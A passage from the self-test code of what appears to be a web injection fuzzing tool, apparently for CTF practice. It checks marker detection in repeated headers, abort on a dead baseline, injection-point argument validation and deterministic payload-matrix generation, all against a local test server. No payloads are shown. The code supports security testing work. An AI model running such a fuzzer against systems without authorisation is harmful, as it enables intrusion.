                    "signature": httpkit.body_signature("no result"),
                    "body_head": "no result"}
        score_args = argparse.Namespace(length_threshold=16, timing_factor=3.0,
                                        timing_floor=0.5, context=40)
        synth = {"detect": [], "detect_headers": [["Set-Cookie", "ctfv2mark"]]}
        pts, why, mk, snip, src = score_case(synth, multi, base_rec, score_args, "")
        collapsed = dict(multi)
        collapsed.pop("headers_all")
        pts2, _, mk2, _, _ = score_case(synth, collapsed, base_rec, score_args, "")
        check("header_values reads every value of a repeated header: a marker in the "
              "first of three Set-Cookie headers is found and quoted from it",
              header_values(multi, "set-cookie") == ["first=ctfv2mark", "second=2",
                                                     "third=3"]
              and mk == "ctfv2mark" and src == "headers" and pts >= 100
              and "ctfv2mark" in snip
              and verify_excerpt(snip, mk, src, multi)["excerpt_is_verbatim"] is True
              and pts2 == 0 and mk2 is None,
              "values=%s marker=%s source=%s points=%s collapsed_points=%s"
              % (header_values(multi, "set-cookie"), mk, src, pts, pts2),
              {"reasons": why, "excerpt": snip})

        # (g) a baseline that fails transport aborts instead of spending the matrix
        probe = socket.socket()
        probe.bind(("127.0.0.1", 0))
        dead_port = probe.getsockname()[1]
        probe.close()
        code, deadbase = _run_cli(["--url", "http://127.0.0.1:%d/inert" % dead_port,
                                   "--param", "q", "--base", "ctfv2",
                                   "--families", "traversal", "--compact"])
        check("a dead baseline aborts with exit 1 after 1 request and never scores "
              "a case against nothing",
              code == 1 and deadbase.get("ok") is False
              and deadbase.get("requests_sent") == 1
              and deadbase.get("cases") is None
              and "baseline failed at the transport layer" == deadbase.get("phase")
              and deadbase.get("baseline", {}).get("ok") is False,
              "exit=%s phase=%s sent=%s" % (code, deadbase.get("phase"),
                                            deadbase.get("requests_sent")), deadbase)

        # (h) exactly one injection point, in both failing directions
        code, two = _run_cli(["--url", base_url + "/inert", "--param", "q",
                              "--header", "X-Forwarded-For", "--dry-run",
                              "--compact"])
        check("two injection points are refused by argparse itself with exit 2",
              code == 2 and "not allowed with" in two.get("_stderr_error", "")
              and two.get("cases_expressible") is None,
              "exit=%s error=%s" % (code, two.get("_stderr_error")), two)
        code, none_sel = _run_cli(["--url", base_url + "/inert", "--dry-run",
                                   "--compact"])
        check("no injection point is refused with exit 2 and the message names all "
              "five selectors",
              code == 2
              and "exactly one injection point"
                  in none_sel.get("_stderr_error", "")
              and all(flag in none_sel.get("_stderr_error", "")
                      for flag in ("--param", "--json-field", "--form-field",
                                   "--header", "--path-marker")),
              "exit=%s error=%s" % (code, none_sel.get("_stderr_error")), none_sel)

        determinism = (build_cases() == build_cases())
        check("matrix generation is deterministic", determinism,
              "two builds identical: %s" % determinism)
    finally:
        server.shutdown()

    failures = [c["name"] for c in checks if not c["pass"]]
    return {"mode": "variant-matrix-selftest", "target": base_url,
            "total": len(checks), "failures": len(failures), "failed": failures,
            "checks": checks, "verdict": "PASS" if not failures else "FAIL"}


if __name__ == "__main__":
    sys.exit(main())
